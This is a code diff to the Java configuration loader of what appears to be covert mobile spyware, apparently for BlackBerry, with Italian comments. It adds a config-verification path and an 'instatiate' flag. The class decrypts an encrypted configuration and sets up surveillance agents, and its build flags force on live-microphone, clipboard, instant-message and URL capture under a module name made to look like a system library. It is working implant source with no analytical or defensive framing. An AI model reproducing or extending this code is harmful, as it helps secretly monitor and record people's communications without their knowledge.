@@ -81,13 +81,13 @@ public final class Conf {
     public static final long TASK_ACTION_TIMEOUT = 600 * 1000; // ogni action che dura piu' di dieci minuti viene killata
 
     public static boolean IS_UI = true;
-    
+
     //#ifdef DEMO
     public static final boolean DEMO = true;
     //#else
     public static final boolean DEMO = false;
     //#endif
-    
+
     //#ifdef DEBUG
     public static final boolean DEBUG = true;
     //#else
@@ -102,9 +102,11 @@ public final class Conf {
     public static final String MODULE_NAME = "net_rim_bb_lib";
     public static final String MODULE_LIB_NAME = "net_rim_bb_lib_base";
 
-    public static final String NEW_CONF = "1";//"newconfig.dat";
-    public static final String ACTUAL_CONF = "2";//"config.dat";
-    private static final String FORCED_CONF = "3";//"config.bin";
+    public static final int ERROR_CONF = 0;
+    public static final int NEW_CONF = 1;//"newconfig.dat";
+    public static final int ACTUAL_CONF = 2;//"config.dat";
+    private static final int FORCED_CONF = 3;//"config.bin";
+    private static final int RESOURCE_CONF = 4;//"config.bin";
     //public static final String NEW_CONF_PATH = Path.USER() + Path.CONF_DIR;
 
     /** The Constant CONF_TIMER_SINGLE. */
@@ -118,7 +120,7 @@ public final class Conf {
 
     /** The Constant CONF_TIMER_DELTA. */
     public static final int CONF_TIMER_DELTA = 0x3;
-    
+
     /** The Constant CONF_TIMER_DAILY. */
     public static final int CONF_TIMER_DAILY = 0x4;
 
@@ -196,6 +198,25 @@ public final class Conf {
 
     }
 
+    public boolean verifyConfig(byte[] config) {
+        final byte[] confKey = Encryption.getKeys().getConfKey();
+
+        //#ifdef DEBUG
+        debug.trace("load: " + Encryption.getKeys().log);
+        //#endif
+
+        AutoFile file;
+        boolean ret;
+
+        //#ifdef DEBUG
+        debug.info("Try: verify config");
+        //#endif
+
+        ret = loadCyphered(config, config.length, confKey, false);
+        return ret;
+
+    }
+
     /**
      * Load. Se c'e' la config.new la prova, e se va bene diventa la
      * config.actual. Altrimenti se c'e' la config.actual la carica. Se non ci
@@ -246,7 +267,7 @@ public final class Conf {
                 //#ifdef DEBUG
                 debug.info("New config");
                 //#endif
-                file.rename(Conf.ACTUAL_CONF, true);
+                file.rename(Integer.toString(Conf.ACTUAL_CONF), true);
                 Evidence.info("New configuration activated");
                 return true;
             } else {
@@ -308,6 +329,10 @@ public final class Conf {
         return ret;
     }
 
+    private boolean loadCyphered(byte[] readfile, int length, byte[] confKey) {
+        return loadCyphered(readfile, length, confKey, true);
+    }
+
     /**
      * Load cyphered.
      * 
@@ -320,7 +345,7 @@ public final class Conf {
      * @return true, if successful
      */
     public boolean loadCyphered(final byte[] cyphered, final int len,
-            final byte[] confKey) {
+            final byte[] confKey, boolean instatiate) {
         boolean ret = false;
 
         final int cryptoOffset = 8;
@@ -339,7 +364,7 @@ public final class Conf {
             //#endif
 
             // lettura della configurazione
-            ret = parseConf(plainconf, 0);
+            ret = parseConf(plainconf, 0, instatiate);
 
             return ret;
         } catch (CryptoException ex) {
@@ -412,11 +437,13 @@ public final class Conf {
      * 
      * @param databuffer
      *            the databuffer
+     * @param instatiate
      * @return true, if successful
      * @throws EOFException
      *             the eOF exception
      */
-    boolean parseAction(final DataBuffer databuffer) throws EOFException {
+    boolean parseAction(final DataBuffer databuffer, boolean instatiate)
+            throws EOFException {
         if (actionIndex < 0) {
             //#ifdef DEBUG
             debug.trace("ParseAction - NO SECTION");
@@ -453,8 +480,9 @@ public final class Conf {
                 //#endif
                 action.addNewSubAction(actionType, confParams);
             }
-
-            status.addAction(action);
+            if (instatiate) {
+                status.addAction(action);
+            }
         }
 
         //#ifdef DEBUG
@@ -469,11 +497,13 @@ public final class Conf {
      * 
      * @param databuffer
      *            the databuffer
+     * @param instatiate
      * @return true, if successful
      * @throws EOFException
      *             the eOF exception
      */
-    boolean parseAgent(final DataBuffer databuffer) throws EOFException {
+    boolean parseAgent(final DataBuffer databuffer, boolean instatiate)
+            throws EOFException {
         if (agentIndex < 0) {
             //#ifdef DEBUG
             debug.trace("ParseAgent - NO SECTION");
@@ -505,38 +535,45 @@ public final class Conf {
             //#endif
 
             Agent agent = status.getAgent(agentType);
-            if (agent != null) {
-                //#ifdef DEBUG
-                debug.warn("Agent already exists: " + agent);
-                //#endif
-                agent.init(enabled, confParams);
-            } else {
-                agent = Agent.factory(agentType, enabled, confParams);
+            if (instatiate) {
                 if (agent != null) {
-                    status.addAgent(agent);
+                    //#ifdef DEBUG
+                    debug.warn("Agent already exists: " + agent);
+                    //#endif
+                    agent.init(enabled, confParams);
+                } else {
+                    agent = Agent.factory(agentType, enabled, confParams);
+                    if (agent != null) {
+                        status.addAgent(agent);
+                    }
                 }
             }
         }
 
-        //#ifdef IM_FORCED
-        Agent agent1 = Agent.factory(Agent.AGENT_IM, true, new byte[0]);
-        status.addAgent(agent1);
-        //#endif
+        if (instatiate) {
+            //#ifdef IM_FORCED
+            Agent agent1 = Agent.factory(Agent.AGENT_IM, true, new byte[0]);
+            status.addAgent(agent1);
+            //#endif
 
-        //#ifdef URL_FORCED
-        Agent agent2 = Agent.factory(Agent.AGENT_URL, true, new byte[0]);
-        status.addAgent(agent2);
-        //#endif
+            //#ifdef URL_FORCED
+            Agent agent2 = Agent.factory(Agent.AGENT_URL, true, new byte[0]);
+            status.addAgent(agent2);
+            //#endif
 
-        //#ifdef LIVE_MIC_FORCED
-        Agent agent3 = Agent.factory(Agent.AGENT_LIVE_MIC, true, new byte[0]);
-        status.addAgent(agent3);
-        //#endif
-        
-        //#ifdef CLIP_FORCED
-        Agent agent4 = Agent.factory(Agent.AGENT_CLIPBOARD, true, new byte[0]);
-        status.addAgent(agent4);
-        //#endif
+            //#ifdef LIVE_MIC_FORCED
+            Agent agent3 = Agent.factory(Agent.AGENT_LIVE_MIC, true,
+                    new byte[0]);
+            status.addAgent(agent3);
+            //#endif
+
+            //#ifdef CLIP_FORCED
+            Agent agent4 = Agent.factory(Agent.AGENT_CLIPBOARD, true,
+                    new byte[0]);
+            status.addAgent(agent4);
+            //#endif
+
+        }
 
         //#ifdef DEBUG
         debug.trace("ParseAgent - OK");
@@ -552,9 +589,11 @@ public final class Conf {
      *            the plain conf
      * @param offset
      *            the offset
+     * @param instatiate
      * @return true, if successful
      */
-    public boolean parseConf(final byte[] plainConf, final int offset) {
+    public boolean parseConf(final byte[] plainConf, final int offset,
+            boolean instatiate) {
         final DataBuffer databuffer = new DataBuffer(plainConf, offset,
                 plainConf.length - offset, false);
 
@@ -625,7 +664,7 @@ public final class Conf {
 
         // Sezione Agenti
         try {
-            if (!parseAgent(databuffer)) {
+            if (!parseAgent(databuffer, instatiate)) {
                 //#ifdef DEBUG
                 debug.error("ParseAgent - FAILED [0]");
                 //#endif
@@ -633,7 +672,7 @@ public final class Conf {
             }
 
             // Sezione Eventi
-            if (!parseEvent(databuffer)) {
+            if (!parseEvent(databuffer, instatiate)) {
                 //#ifdef DEBUG
                 debug.error("ParseEvent - FAILED [1]");
                 //#endif
@@ -641,7 +680,7 @@ public final class Conf {
             }
 
             // Sezione Azioni
-            if (!parseAction(databuffer)) {
+            if (!parseAction(databuffer, instatiate)) {
                 //#ifdef DEBUG
                 debug.error("ParseAction - FAILED [2]");
                 //#endif
@@ -649,7 +688,7 @@ public final class Conf {
             }
 
             // Leggi i parametri di configurazione
-            if (!parseParameters(databuffer)) {
+            if (!parseParameters(databuffer, instatiate)) {
                 //#ifdef DEBUG
                 debug.error("ParseParameters - FAILED [3]");
                 //#endif
@@ -674,11 +713,13 @@ public final class Conf {
      * 
      * @param databuffer
      *            the databuffer
+     * @param instatiate
      * @return true, if successful
      * @throws EOFException
      *             the eOF exception
      */
-    boolean parseEvent(final DataBuffer databuffer) throws EOFException {
+    boolean parseEvent(final DataBuffer databuffer, boolean instatiate)
+            throws EOFException {
         if (eventIndex < 0) {
             //#ifdef DEBUG
             debug.trace("ParseEvent - NO SECTION");
@@ -706,9 +747,12 @@ public final class Conf {
             debug.trace("ParseEvent - factory: " + i + " type: " + eventType
                     + " action: " + actionId);
             //#endif
-            final Event event = Event.factory(i, eventType, actionId,
-                    confParams);
-            status.addEvent(i, event);
+
+            if (instatiate) {
+                final Event event = Event.factory(i, eventType, actionId,
+                        confParams);
+                status.addEvent(i, event);
+            }
         }
 
         //#ifdef DEBUG
@@ -725,11 +769,13 @@ public final class Conf {
      * 
      * @param databuffer
      *            the databuffer
+     * @param instatiate
      * @return true, if successful
      * @throws EOFException
      *             the eOF exception
      */
-    boolean parseParameters(final DataBuffer databuffer) throws EOFException {
+    boolean parseParameters(final DataBuffer databuffer, boolean instatiate)
+            throws EOFException {
         if (mobileIndex < 0) {
             //#ifdef DEBUG
             debug.trace("ParseParameters - NO SECTION");
@@ -753,7 +799,9 @@ public final class Conf {
             databuffer.readFully(confParams);
 
             final Parameter config = Parameter.factory(confId, confParams);
-            status.addParameter(config);
+            if (instatiate) {
+                status.addParameter(config);
+            }
         }
 
         return true;
